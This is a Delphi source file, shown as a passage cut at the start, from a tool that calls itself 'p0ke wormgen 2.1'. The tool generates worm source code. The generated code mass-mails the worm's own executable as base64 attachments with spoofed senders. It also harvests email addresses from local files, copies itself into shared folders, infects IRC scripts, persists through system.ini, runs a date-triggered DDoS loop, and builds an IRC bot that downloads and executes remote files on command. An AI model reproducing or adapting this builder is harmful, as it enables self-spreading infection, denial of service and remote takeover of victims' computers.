  SvFile(Dir, ' VAR');
  if und then tmp1 := randund else tmp1 := 'Q';
  if und then tmp2 := randund else tmp2 := 'Strg';
  SvFile(Dir, '   '+tmp1+'    : '+Quad+';');
  SvFile(Dir, '   '+tmp2+' : STRING;');
  SvFile(Dir, ' BEGIN');
  SvFile(Dir, '   IF Count<3 THEN BEGIN');
  SvFile(Dir, '     T[3]:=0;');
  SvFile(Dir, '     '+tmp1+'[4]:=64;');
  SvFile(Dir, '   END ELSE '+tmp1+'[4]:=(T[3] AND $3F);');
  SvFile(Dir, '   IF Count<2 THEN BEGIN');
  SvFile(Dir, '     T[2]:=0;');
  SvFile(Dir, '     '+tmp1+'[3]:=64;');
  SvFile(Dir, '   END ELSE '+tmp1+'[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);');
  SvFile(Dir, '   '+tmp1+'[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);');
  SvFile(Dir, '   '+tmp1+'[1]:=((T[1] SHR 2) AND $3F);');
  SvFile(Dir, '   '+tmp2+':='''';');
  SvFile(Dir, '   FOR Count:=1 TO 4 DO '+tmp2+':=('+tmp2+'+'+CC+'[('+tmp1+'[Count]+1)]);');
  SvFile(Dir, '   RESULT:='+tmp2+';');
  SvFile(Dir, ' END;');
  SvFile(Dir, '');
  Tmp1 := '';
  Tmp2 := '';
  Form8.Progressbar1.Position :=  45;
  Status('Done Writing Base64 Encode Procedure 1');
  Status('Writing Base64 Encode Procedure 2');
  SvFile(Dir, ' FUNCTION BASE64(DataLength:DWORD) : AnsiString;');
  SvFile(Dir, ' VAR');
 If Und Then Tmp1 := RandUnd Else Tmp1 := 'B';
 If Und Then Tmp2 := RandUnd Else Tmp2 := 'I';
 If Und Then Tmp3 := RandUnd Else Tmp3 := 'Remain';
 If Und Then Tmp4 := RandUnd Else Tmp4 := 'Trip';
 If Und Then Tmp5 := RandUnd Else Tmp5 := 'Count';
  SvFile(Dir, '   '+tmp1+'      : AnsiString;');
  SvFile(Dir, '   '+tmp2+'      : DWORD;');
  SvFile(Dir, '   '+tmp3+'      : DWORD;');
  SvFile(Dir, '   '+tmp4+'      : '+Triple+';');
  SvFile(Dir, '   '+tmp5+'      : WORD;');
  SvFile(Dir, ' BEGIN');
  SvFile(Dir, '   '+tmp5+':=0;');
  SvFile(Dir, '   '+tmp1+':='''';');
  SvFile(Dir, '   FOR '+tmp2+':=1 TO DataLength DIV 3 DO BEGIN');
  SvFile(Dir, '     INC('+tmp5+',4);');
  SvFile(Dir, '     '+tmp4+'[1]:=Ord('+FileBuf+'[('+tmp2+'-1)*3+1]);');
  SvFile(Dir, '     '+tmp4+'[2]:=Ord('+FileBuf+'[('+tmp2+'-1)*3+2]);');
  SvFile(Dir, '     '+tmp4+'[3]:=Ord('+FileBuf+'[('+tmp2+'-1)*3+3]);');
  SvFile(Dir, '     '+tmp1+':='+tmp1+'+codeb64(3,'+tmp4+');');
  SvFile(Dir, '     IF '+tmp5+'=76 THEN BEGIN');
  SvFile(Dir, '       '+tmp1+':='+tmp1+'+#13#10;');
  SvFile(Dir, '       '+tmp5+':=0;');
  SvFile(Dir, '     END;');
  SvFile(Dir, '   END;');
  SvFile(Dir, '   '+tmp3+':=DataLength-(DataLength DIV 3)*3;');
  SvFile(Dir, '   IF '+tmp3+'>0 THEN BEGIN');
  SvFile(Dir, '     '+tmp4+'[1]:=Ord('+FileBuf+'[DataLength-1]);');
  SvFile(Dir, '     IF '+tmp3+'>1 THEN '+tmp4+'[2]:=Ord('+FileBuf+'[DataLength]);');
  SvFile(Dir, '     IF '+tmp3+'=1 THEN '+tmp1+':='+tmp1+'+Codeb64(1,'+tmp4+') ELSE '+tmp1+':='+tmp1+'+Codeb64(2,'+tmp4+');');
  SvFile(Dir, '   END;');
  SvFile(Dir, '   RESULT:='+tmp1+';');
  SvFile(Dir, ' END;');
  SvFile(Dir, '');
 Tmp1 := '';
 Tmp2 := '';
 Tmp3 := '';
 Tmp4 := '';
 Tmp5 := '';
 Form8.Progressbar1.Position :=  50;
 Status('Writing Mass-Mailing procedure');
 SvFile(Dir, ' // Small modifies of positrons mail-send code.');
 SvFile(Dir, ' // Get the relay-server code at www.positron.cjb.net');
 SvFile(Dir, ' // greets positrion, ur code rules');

 SvFile(Dir, ' Procedure SendMail(Recip, FromM, Server: String);');
 SvFile(Dir, ' Var');
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'Sock';
  If Und Then Tmp2 := RandUnd Else Tmp2 := 'WsaDatas';
  If Und Then Tmp3 := RandUnd Else Tmp3 := 'SockAddrIn';
  If Und Then Tmp4 := RandUnd Else Tmp4 := 'F';
  If Und Then Tmp5 := RandUnd Else Tmp5 := 'Body';
  If Und Then Tmp6 := RandUnd Else Tmp6 := 'Attach';
  If Und Then Tmp7 := RandUnd Else Tmp7 := 'Sub';
  If Und Then Tmp8 := RandUnd Else Tmp8 := 'CTyp';
  If Und Then Tmp9 := RandUnd Else Tmp9 := 'Linfo';
 SvFile(Dir, '  '+Tmp1+'             : TSocket;');
 SvFile(Dir, '  '+Tmp2+'         : TWSADATA;');
 SvFile(Dir, '  '+Tmp3+'       : TSockAddrIn;');
 SvFile(Dir, '  '+Tmp4+'                : FILE;');
 SvFile(Dir, '  '+Tmp5+', '+Tmp6+',');
 SvFile(Dir, '  '+Tmp7+', '+Tmp8+'        : String;');
 SvFile(Dir, '  '+Tmp9+'            : Integer;');
 SvFile(Dir, '');
 SvFile(Dir, ' Procedure Mys(STR:STRING);');
 SvFile(Dir, ' Begin');
 SvFile(Dir, '  Send('+Tmp1+',STR[1],Length(STR),0);');
 SvFile(Dir, ' End;');
 SvFile(Dir, '');
 SvFile(Dir, ' Begin');
 SvFile(Dir, '');
 If Form1.CheckBox8.Checked Then Begin
  SvFile(Dir, ' Randomize;');
  SvFile(Dir, ' '+tmp9+' := Random('+IntToStr(Form4.ListView1.items.count)+');');
  SvFile(Dir, ' '+tmp5+' := Bodies['+tmp9+'];');
  SvFile(Dir, ' '+tmp6+' := Attachs['+tmp9+'];');
  SvFile(Dir, ' '+tmp7+' := Subj['+tmp9+'];');
  SvFile(Dir, ' '+tmp8+' := Ctypz['+tmp9+'];');
  SvFile(Dir, ' FromM := Fromz['+tmp9+'];');
 End;
 If Form1.CheckBox7.Checked Then Begin
  SvFile(Dir, ' '+tmp5+' := '+m_bod+';');
  SvFile(Dir, ' '+tmp6+' := '+m_att+';');
  SvFile(Dir, ' '+tmp7+' := '+m_sub+';');
  SvFile(Dir, ' '+tmp8+' := ''audio/x-wav'';');
  SvFile(Dir, ' FromM := ''Jesus@Hotmail.Com'';');
 End;
 SvFile(Dir, '');
 SvFile(Dir, ' WSAStartUp(257,'+Tmp2+');');
 SvFile(Dir, ' '+Tmp1+':=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);');
 SvFile(Dir, ' '+Tmp3+'.sin_family:=AF_INET;');
 SvFile(Dir, ' '+Tmp3+'.sin_port:=htons(25);');
 SvFile(Dir, ' '+Tmp3+'.sin_addr.S_addr:=inet_addr(PChar(Server));');
 SvFile(Dir, ' If Connect('+Tmp1+','+Tmp3+',SizeOf('+Tmp3+')) <> SOCKET_ERROR Then Begin');
 SvFile(Dir, '  Mys(''HELO .com''+#13#10);');
 SvFile(Dir, '  If Pos(''<'', Fromm)>0 Then');
 SvFile(Dir, '   Mys(''Mail From: ''+Copy(FromM, Pos(''<'', FromM)+1, Pos(''>'', FromM)-2)+#13#10) Else');
 SvFile(Dir, '   Mys(''MAIL FROM: ''+FromM+#13#10);');
 SvFile(Dir, '  Mys(''RCPT TO: ''+recip+#13#10);');
 SvFile(Dir, '  Mys(''DATA''+#13#10);');
 SvFile(Dir, '');
 SvFile(Dir, '  Mys(''From: ''+FromM+#13#10);');
 SvFile(Dir, '  Mys(''Subject: ''+'+Tmp7+'+#13#10);');
 SvFile(Dir, '  Mys(''To: ''+Recip+#13#10);');
 SvFile(Dir, '');
 SvFile(Dir, '  Mys(''MIME-Version: 1.0''+#13#10);');
 SvFile(Dir, '  Mys(''Content-Type: multipart/mixed; boundary="ShutFace"''+#13#10+#13#10);');
 SvFile(Dir, '  Mys(''--ShutFace''+#13#10);');
 SvFile(Dir, '  Mys(''Content-Type: text/plain; charset:us-ascii''+#13#10+#13#10);');
 SvFile(Dir, '');
 SvFile(Dir, '  Mys('+Tmp5+'+#13#10);');
 SvFile(Dir, '');
 SvFile(Dir, '  Mys(#13#10+#13#10);');
 SvFile(Dir, '  Mys(''--ShutFace''+#13#10);');
 SvFile(Dir, '  Mys(''Content-Type: ''+'+Tmp8+'+'';''+#13#10);');
 SvFile(Dir, '  Mys(''    name="''+'+Tmp6+'+''"''+#13#10);');
 SvFile(Dir, '  Mys(''Content-Transfer-Encoding: base64''+#13#10+#13#10);');
 SvFile(Dir, '  AssignFile('+Tmp4+',ParamStr(0));');
 SvFile(Dir, '  FileMode:=0;');
 SvFile(Dir, '  {$I-}');
 SvFile(Dir, '  Reset('+Tmp4+',1);');
 SvFile(Dir, '  IF IOResult=0 THEN BEGIN');
 SvFile(Dir, '   BlockRead('+Tmp4+','+FileBuf+'[1],FileSize(ParamStr(0)));');
 SvFile(Dir, '   Mys(BASE64(FileSize(ParamStr(0))));');
 SvFile(Dir, '   CloseFile('+Tmp4+');');
 SvFile(Dir, '  END;');
 SvFile(Dir, '  {$I+}');
 SvFile(Dir, '  Mys(#13#10+''--ShutFace--''+#13#10+#13#10);');
 SvFile(Dir, '  Mys(#13#10+''.''+#13#10);');
 SvFile(Dir, '  Mys(''QUIT''+#13#10);');
 SvFile(Dir, ' End;');
 SvFile(Dir, ' End;');
 SvFile(Dir, '');
 tmp1 := '';
 tmp2 := '';
 tmp3 := '';
 tmp4 := '';
 tmp5 := '';
 tmp6 := '';
 tmp7 := '';
 tmp8 := '';
 Status('Done Writing Mass-Mailing procedure');
 End Else
  Status('No Mass-mailing Spread Selected');
 Form8.Progressbar1.Position :=  60;
 If (Form1.CheckBox5.checked) or (Form1.CheckBox6.checked) or
    (Form1.CheckBox7.checked) or (Form1.CheckBox9.checked) or
    (Form1.CheckBox10.checked) Then Begin
  Status('Writing Find-Procedure');

  If Und Then Tmp1 := RandUnd Else Tmp1 := 'SR';
  If Und Then Tmp2 := RandUnd Else Tmp2 := 'ext';
  If Und Then Tmp3 := RandUnd Else Tmp3 := 'fil';
  If Und Then Tmp4 := RandUnd Else Tmp4 := 'l1';
  If Und Then Tmp5 := RandUnd Else Tmp5 := 'l2';
  If Und Then Tmp6 := RandUnd Else Tmp6 := 'lin';
  SvFile(Dir, ' Procedure FFind(D, Name, SearchName : String);');
  SvFile(Dir, '   var');
  SvFile(Dir, '   '+Tmp1+': TSearchRec;');
  SvFile(Dir, '   '+Tmp2+': string;');
  SvFile(Dir, '   '+Tmp3+': textfile;');
  SvFile(Dir, '   '+Tmp4+': string;');
  SvFile(Dir, '   '+Tmp5+': string;');
  SvFile(Dir, '   '+Tmp6+': string;');
  SvFile(Dir, ' begin');
  SvFile(Dir, '   If D[Length(D)] <> ''\'' then D := D + ''\'';');
  SvFile(Dir, '');
  SvFile(Dir, '   If FindFirst(D + ''*.*'', faDirectory, '+Tmp1+') = 0 then');
  SvFile(Dir, '     Repeat');
  SvFile(Dir, '       If (('+tmp1+'.Attr and faDirectory) = faDirectory) and ('+Tmp1+'.Name[1] <> ''.'') then');
  SvFile(Dir, '         FFind(D + '+Tmp1+'.Name + ''\'', Name, SearchName)');
  SvFile(Dir, '       Else Begin');
  SvFile(Dir, '         '+Tmp2+' := ExtractFileExt('+Tmp1+'.Name);');
  SvFile(Dir, '');

  If Form1.Checkbox6.Checked Then Begin
   SvFile(Dir, '   If '+Tmp2+' = ''txt'' then '+Mails+' := '+Mails+' + GrabMails(D + '+Tmp1+'.Name);');
   SvFile(Dir, '   If '+Tmp2+' = ''html'' then '+Mails+' := '+Mails+' + GrabMails(D + '+Tmp1+'.Name);');
   SvFile(Dir, '   If '+Tmp2+' = ''htm'' then '+Mails+' := '+Mails+' + GrabMails(D + '+Tmp1+'.Name);');
   SvFile(Dir, '   If '+Tmp2+' = ''doc'' then '+Mails+' := '+Mails+' + GrabMails(D + '+Tmp1+'.Name);');
   SvFile(Dir, '   If '+Tmp2+' = ''vbs'' then '+Mails+' := '+Mails+' + GrabMails(D + '+Tmp1+'.Name);');
  End;
  If Form1.CheckBox5.Checked Then Begin
   For I := 0 To Form2.ListView1.Items.Count -1 Do
    SvFile(Dir,
    'If ('+Tmp2+' = ''' + Form2.ListView1.Items[i].Caption + ''') and'+
    '   (FileSize('+Tmp1+'.Name) <= '+Form2.ListView1.Items[i].subitems[0]+') Then'+
    '   '+Mails+' := '+Mails+' + GrabMails(D + '+Tmp1+'.Name);');
  End;
  If (Form1.CheckBox7.Checked) Then Begin

   SvFile(Dir, ' If '+m_sub+' = '''' Then Begin');
   SvFile(Dir, '  If '+tmp2+' = ''txt'' Then Begin');
   SvFile(Dir, '   AssignFile('+tmp3+', d+'+tmp1+'.name);');
   SvFile(Dir, '   Reset('+tmp3+');');
   SvFile(Dir, '   '+tmp6+' := '''';');
   SvFile(Dir, '   Read('+tmp3+', '+tmp4+');');
   SvFile(Dir, '   ReadLn('+tmp3+', '+tmp5+');');
   SvFile(Dir, '   '+tmp6+' := '+tmp6+' + '+tmp4+';');
   SvFile(Dir, '   While not Eof('+tmp3+') Do Begin');
   SvFile(Dir, '    Read('+tmp3+', '+tmp4+');');
   SvFile(Dir, '    ReadLn('+tmp3+', '+tmp5+');');
   SvFile(Dir, '    '+tmp6+' := '+tmp6+' + '+tmp4+';');
   SvFile(Dir, '   End;');
   SvFile(Dir, '   CloseFile('+tmp3+');');
   SvFile(Dir, '   '+m_bod+' := '+tmp6+';');
   SvFile(Dir, '   '+m_att+' := '+tmp1+'.name+''.exe'';');
   SvFile(Dir, '   '+m_sub+' := copy('+tmp1+'.name, 1, pos(''.'', '+tmp1+'.name)-1);');
   SvFile(Dir, '  End;');
   SvFile(Dir, ' End;');
  End;
  If form1.checkbox9.Checked then begin

  For I:=0 To Form5.ListView1.Items.Count -1 Do
   SvFile(Dir,
   ' If Pos('''+form5.listview1.Items[i].caption+''','+
   '        ExtractFileName(Copy(D, 1, Length(D)-1)))>0 Then'+
   '        CopyFile(pChar(ParamStr(0)), pChar(D+'''+Form5.listview1.Items[i].SubItems[0]+'''), False);');
  End;

  If Form1.CheckBox10.Checked Then Begin
   SvFile(Dir, 'If '+tmp1+'.name = ''script.ini'' Then InfectIrc(D + '+tmp1+'.Name);');
  End;

  SvFile(Dir, '        End;');
  SvFile(Dir, '     Until (FindNext('+Tmp1+') <> 0);');
  SvFile(Dir, '   FindClose('+Tmp1+');');
  SvFile(Dir, ' end;');

  Status('Done Writing Find-Procedure');
 End;
 If Form1.CheckBox13.Checked then begin
  SvFile(Dir, ' Procedure DDoS;');
  SvFile(Dir, ' Begin');
  If Form11.checkbox1.Checked then begin
   SvFile(Dir, '  If '+SysTime+'.wYear >= 20'+copy(form1.statusbar1.panels[2].text, 13, 2)+' then');
   SvFile(Dir, '   If '+SysTime+'.wMonth >= '+copy(form1.statusbar1.panels[2].text, 16, 2)+' then');
  end;
  SvFile(Dir, '    While 1<>2 Do');
  SvFile(Dir, '     '+WebDl+'(0, '''+form1.statusbar1.panels[3].text+''', '''', 0, 0);');
  SvFile(Dir, ' End;');
 end;
 Form8.Progressbar1.Position :=  75;
 SvFile(Dir, '');
 Status('');
 Status('Writing Start-code');
 SvFile(Dir, 'Begin');
 If (Form1.CheckBox12.Checked) or (Form1.CheckBox13.Checked) then begin
  If (Form1.CheckBox12.Checked) then begin
  SvFile(Dir, 'getsystemdirectory('+tmp1+', 255);');
  SvFile(Dir, ''+tmp2+' := '+tmp1+';');
  SvFile(Dir, ''+tmp2+' := '+tmp2+' + ''\' + form1.edit1.text+'.exe'';');
  SvFile(Dir, 'CopyFile(pchar(paramstr(0)), pchar('+tmp2+'), false);');
  SvFile(Dir, 'writeprivateprofilestring(''boot'',''shell'',pchar(''Explorer.exe '+form1.edit1.text+'.exe''),''system.ini'');');
  SvFile(Dir, '');
  end;
  If Form1.CheckBox13.Checked then
   SvFile(Dir, 'CreateThread(Nil, 0, @DDoS, Nil, 0, '+tmp3+');');
  tmp1:='';
  tmp2:='';
  tmp3:='';
 end;
 If Form1.CheckBox14.Checked Then Begin
  SvFile(Dir, '  '+webdl+'(0, '''+Form1.Edit3.text+''', '''', 0, 0);');
 End;
 If Form1.CheckBox13.Checked Then begin
  SvFile(Dir, ' if ('+SysTime+'.wYear < 20'+copy(form1.statusbar1.panels[1].text, 16, 2)+') and');
  SvFile(Dir, ' ('+SysTime+'.wMonth < '+copy(form1.statusbar1.panels[1].text, 19, 2)+') then');
  SvFile(Dir, '  ExitProcess(0);');
  SvFile(Dir, '');
 End;
 If Form1.CheckBox15.Checked then begin
  For I := 0 To Form10.listview1.items.count -1 do begin
   SvFile(Dir, '  '+webdl+'(0, '''+form10.listview1.items[i].caption+''', ''C:\win3'+inttostr(i)+'.exe'', 0, 0);');
   SvFile(Dir, 'WinExec(''C:\win3'+inttostr(i)+'.exe'',0);');
  end;
 end;
 If Form1.CheckBox2.Checked Then
  SvFile(Dir, '  Network;');
 If Form1.CheckBox3.Checked Then Begin
  SvFile(Dir, '  FFind(''C:\'', ''*'', ''*.*'');');
  SvFile(Dir, '  While '+Mails+' <> '''' Do Begin');
  SvFile(Dir, '   SendMail(Copy('+Mails+', 1, Pos(#13#10, '+Mails+')-1), ''Stfu@Abuse.com'', ''mx1.hotmail.com'');');
  SvFile(Dir, '   '+Mails+' := Copy('+Mails+', Pos(#13#10, '+Mails+')+ 2, length('+Mails+'));');
  SvFile(Dir, '  End;');
 End;
 Form8.Progressbar1.Position :=  80;
 If Form1.CheckBox11.Checked Then
  SvFile(Dir, ' IrcBot_Start;');
 SvFile(Dir, 'Generated with p0ke wormgen 2.1, Remove this line to get it working');
 SvFile(Dir, 'Visit www.fjun.com/badboll for latest update.');
 SvFile(Dir, ' End.');
 Status('Done writing Start-code');
 Status('');
 If Form1.CheckBox11.Checked Then Begin
  Status('Creating ircbot.pas');
  Dir := ExtractFilePath(Dir);
  Dir := Dir + 'ircbot.pas';
  SvFile(Dir, 'Unit ircbot;');
  SvFile(Dir, 'interface');
  SvFile(Dir, '');
  SvFile(Dir, 'Uses Windows, Winsock, ShellApi;');
  If Und Then Str01 := RandUnd Else Str01 := 'Str01';
  If Und Then Sock1 := RandUnd Else Sock1 := 'Sock1';
  If Und Then SockInfo := RandUnd Else SockInfo := 'SockInfo';
  If Und Then WSADATA := RandUnd Else WSADATA := 'WSADATA';
  If Und Then BUF := RandUnd Else BUF := 'BUF';
  SvFile(Dir, ' Var');
  SvFile(Dir, '  '+Str01+' : string;');
  SvFile(Dir, '  '+Sock1+' : TSocket;');
  SvFile(Dir, '  '+SockInfo+' : SockAddr_In;');
  SvFile(Dir, '  '+WSADATA+' : TWSAData;');
  SvFile(Dir, '  '+BUF+' : Array[0..65536] of char;');
  SvFile(Dir, '');
  SvFile(Dir, ' function DLF(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external ''URLMON.DLL'' name ''URLDownloadToFileA'';');
  SvFile(Dir, ' Procedure IrcBot_Start;');
  SvFile(Dir, 'implementation');
  SvFile(Dir, '');
  Form8.Progressbar1.Position :=  85;
 If Und Then Tmp1 := RandUnd Else Tmp1 := 'TAPInAddr';
 If Und Then Tmp2 := RandUnd Else Tmp2 := 'PAPInAddr';
 If Und Then Tmp3 := RandUnd Else Tmp3 := 'WSAData';
 If Und Then Tmp4 := RandUnd Else Tmp4 := 'HostEntPtr';
 If Und Then Tmp5 := RandUnd Else Tmp5 := 'PPtr';
 If Und Then Tmp6 := RandUnd Else Tmp6 := 'I';

  SvFile(Dir, ' FUNCTION getip(HostName:STRING) : STRING;');
  SvFile(Dir, ' LABEL Abort;');
  SvFile(Dir, ' TYPE');
  SvFile(Dir, '  '+Tmp1+' = ARRAY[0..100] OF PInAddr;');
  SvFile(Dir, '  '+Tmp2+' =^'+Tmp1+';');
  SvFile(Dir, ' VAR');
  SvFile(Dir, '  '+Tmp3+'    : TWSAData;');
  SvFile(Dir, '  '+Tmp4+' : PHostEnt;');
  SvFile(Dir, '  '+Tmp5+'       : '+Tmp2+';');
  SvFile(Dir, '  '+Tmp6+'          : Integer;');
  SvFile(Dir, ' BEGIN');
  SvFile(Dir, '  Result:='''';');
  SvFile(Dir, '  WSAStartUp($101,'+Tmp3+');');
  SvFile(Dir, '  TRY');
  SvFile(Dir, '   '+Tmp4+':=GetHostByName(PChar(HostName));');
  SvFile(Dir, '   IF '+Tmp4+'=NIL THEN GOTO Abort;');
  SvFile(Dir, '   '+Tmp5+':='+Tmp2+'('+Tmp4+'^.h_addr_list);');
  SvFile(Dir, '   '+Tmp6+':=0;');
  SvFile(Dir, '   WHILE '+Tmp5+'^['+Tmp6+']<>NIL DO BEGIN');
  SvFile(Dir, '    IF HostName='''' THEN BEGIN');
  SvFile(Dir, '     IF(Pos(''169'',inet_ntoa('+Tmp5+'^['+Tmp6+']^))<>1)AND(Pos(''192'',inet_ntoa('+Tmp5+'^['+Tmp6+']^))<>1) THEN BEGIN');
  SvFile(Dir, '      Result:=inet_ntoa('+Tmp5+'^['+Tmp6+']^);');
  SvFile(Dir, '      GOTO Abort;');
  SvFile(Dir, '     END;');
  SvFile(Dir, '    END ELSE');
  SvFile(Dir, '   RESULT:=(inet_ntoa('+Tmp5+'^['+Tmp6+']^));');
  SvFile(Dir, '   Inc('+Tmp6+');');
  SvFile(Dir, '  END;');
  SvFile(Dir, '  Abort:');
  SvFile(Dir, ' EXCEPT');
  SvFile(Dir, ' END;');
  SvFile(Dir, 'WSACleanUp();');
  SvFile(Dir, 'END;');
  SvFile(Dir, '');
  Form8.Progressbar1.Position :=  90;
  Status('');
  Status('Adding IntToStr() Function');
  SvFile(Dir, ' function IntToStr(X: integer): string;');
  SvFile(Dir, ' var');
  SvFile(Dir, '  '+tmp1+': string;');
  SvFile(Dir, ' begin');
  SvFile(Dir, '  Str(X, '+tmp1+');');
  SvFile(Dir, '  Result := '+tmp1+';');
  SvFile(Dir, ' end;');
  SvFile(Dir, '');
  Status('IntToStr() Function Added');
  Status('');
  Status('Adding ReadString Function');
  tmp1 := '';
  tmp2 := '';
  tmp3 := '';
  tmp4 := '';
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'Answer';
  If Und Then Tmp2 := RandUnd Else Tmp2 := 'tmp1';
  If Und Then Tmp3 := RandUnd Else Tmp3 := 'tmp2';
  If Und Then Tmp4 := RandUnd Else Tmp4 := 'tmp3';
  SvFile(Dir, ' Procedure ReadString;');
  SvFile(Dir, ' var');
  SvFile(Dir, '  '+tmp1+' : String;');
  SvFile(Dir, '  '+tmp2+', '+tmp3+', '+tmp4+':string;');
  SvFile(Dir, ' Begin');
  SvFile(Dir, '  ZeroMemory(@'+str01+', SizeOf('+str01+'));');
  SvFile(Dir, '  '+str01+' := '+BUF+';');
  SvFile(Dir, '  ZeroMemory(@'+BUF+', SizeOf('+BUF+'));');
  SvFile(Dir, '  If POS(''PING'', '+str01+')>0 Then Begin');
  SvFile(Dir, '   '+tmp1+' := Copy( '+str01+', Pos(''PING'','+str01+') + 6, length('+str01+'));');
  SvFile(Dir, '   '+tmp1+' := Copy('+tmp1+', 1, pos(#13#10, '+tmp1+')-1);');
  SvFile(Dir, '   '+tmp1+' := ''PONG :'' + '+tmp1+' + #13#10;');
  SvFile(Dir, '   Send( '+sock1+', '+tmp1+'[1], Length('+tmp1+'), 0);');
  SvFile(Dir, '  end;');
  SvFile(Dir, '  If POS(''MOTD'','+str01+')>0 then begin');
  SvFile(Dir, '   '+tmp1+' := ''JOIN '+Form7.Edit3.text+' '+form7.Edit4.text+'''+ #13#10;');
  SvFile(Dir, '   Send( '+sock1+', '+tmp1+'[1], Length('+tmp1+'), 0);');
  SvFile(Dir, '  end;');
  SvFile(Dir, '  IF POS(''!URL;'', '+str01+')>0 Then Begin');
  SvFile(Dir, '   '+tmp2+' := copy('+str01+', pos(''!URL;'', '+str01+')+5, length('+str01+'));');
  SvFile(Dir, '   '+tmp3+' := copy('+tmp2+', pos('';'', '+tmp2+')+1, length('+tmp2+'));');
  SvFile(Dir, '   '+tmp2+' := copy('+tmp2+', 1, pos('';'', '+tmp2+')-1);');
  SvFile(Dir, '   '+tmp3+' := copy('+tmp3+', 1, pos('';'', '+tmp3+')-1);');
  SvFile(Dir, '   Randomize;');
  SvFile(Dir, '   if '+tmp2+' = '''+Form7.Edit6.Text+''' then begin');
  SvFile(Dir, '    '+tmp4+' := ''C:\dl''+inttostr(random(999))+''.exe'';');
  SvFile(Dir, '    '+tmp1+' := ''PRIVMSG #youstupidfag :Downloading.''+#13#10;');
  SvFile(Dir, '    Send( '+sock1+', '+tmp1+'[1], Length('+tmp1+'), 0);');
  SvFile(Dir, '    DLF(0, pChar('+tmp3+'), pChar('+tmp4+'), 0, 0);');
  SvFile(Dir, '    '+tmp1+' := ''PRIVMSG #youstupidfag :Executing.''+#13#10;');
  SvFile(Dir, '    Send( '+sock1+', '+tmp1+'[1], Length('+tmp1+'), 0);');
  SvFile(Dir, '    ShellExecute(0, ''open'' , pchar('+tmp4+'), nil, nil, 0);');
  SvFile(Dir, '   end;');
  SvFile(Dir, '  end;');
  SvFile(Dir, ' End;');
  SvFile(Dir, '');
  Form8.Progressbar1.Position :=  95;
  Status('ReadString Function Added');
  Status('');
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'Answer';
  If Und Then Tmp2 := RandUnd Else Tmp2 := 'Nick';
  Status('Adding IrcBot Function');
  SvFile(Dir, ' Procedure IrcBot_Start;');
  SvFile(Dir, ' var');
  SvFile(Dir, '  '+Tmp1+' : String;');
  SvFile(Dir, '  '+Tmp2+'   : String;');
  SvFile(Dir, ' begin');
  SvFile(Dir, '  While 1<>2 Do Begin');
  SvFile(Dir, '   '+Tmp2+' := '''+Form7.Edit5.text+''';');
  SvFile(Dir, '   Randomize;');
  SvFile(Dir, '   While Length('+Tmp2+')<12 Do');
  SvFile(Dir, '    '+Tmp2+' := '+Tmp2+' + IntToStr(Random(9));');
  SvFile(Dir, '   WSAStartup(257,'+WSADATA+');');
  SvFile(Dir, '   '+sockinfo+'.sin_family:=PF_INET;');
  SvFile(Dir, '   '+sockinfo+'.sin_port:=htons('+Form7.Edit2.Text+');');
  SvFile(Dir, '   '+sockinfo+'.sin_addr.S_addr:= inet_addr(PChar(getip('''+Form7.Edit1.Text+''')));');
  SvFile(Dir, '   '+sock1+' := socket(PF_INET,SOCK_STREAM,0);');
  SvFile(Dir, '   Connect('+sock1+','+sockinfo+',sizeof('+sockinfo+'));');
  SvFile(Dir, '   '+Tmp1+' := ''USER ''+'+Tmp2+'+'' ''+'+Tmp2+'+''@foo.bar ''+'+Tmp2+'+'' ''+'+Tmp2+'+#13#10;');
  SvFile(Dir, '   Send('+sock1+', '+Tmp1+'[1], Length('+Tmp1+'), 0);');
  SvFile(Dir, '   '+Tmp1+' := '''+Tmp2+' ''+'+Tmp2+'+#13#10;');
  SvFile(Dir, '   Send('+sock1+', '+Tmp1+'[1], Length('+Tmp1+'), 0);');
  SvFile(Dir, '   While 1<>2 do begin');
  SvFile(Dir, '    if (recv('+sock1+','+BUF+',SizeOf('+BUF+'),0)) >= 1 then begin // IF DATA THEN');
  SvFile(Dir, '     ReadString;');
  SvFile(Dir, '    end;');
  SvFile(Dir, '   end;');
  SvFile(Dir, '  end;');
  SvFile(Dir, ' end;');
  SvFile(Dir, '');
  Status('IrcBot Function Added');
  Status('');
  SvFile(Dir, 'end.');
 End;
 Status('');
 Status('Code generated successfully.');
 Form8.Progressbar1.Position := 100;
 form8.button1.enabled := true;
 Form1.Enabled := True;
 GetExitCodeThread(BT, ExitCode);
 ExitThread(ExitCode);
End;

Procedure TForm8.Build(Nam:String);
Var
 A : Dword;
Begin
 Form1.Enabled := False;
 form8.button1.enabled := False;
 BT := CreateThread(nil, 0, @BBuild, nil, 0, a);
End;

procedure TForm8.Button1Click(Sender: TObject);
begin
form1.Enabled := true;
Memo1.Clear;
Form8.Hide;
end;

procedure TForm8.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
If Not button1.Enabled Then CanClose := False Else begin
Memo1.Clear;
form1.Enabled := true;
end;
end;

end.
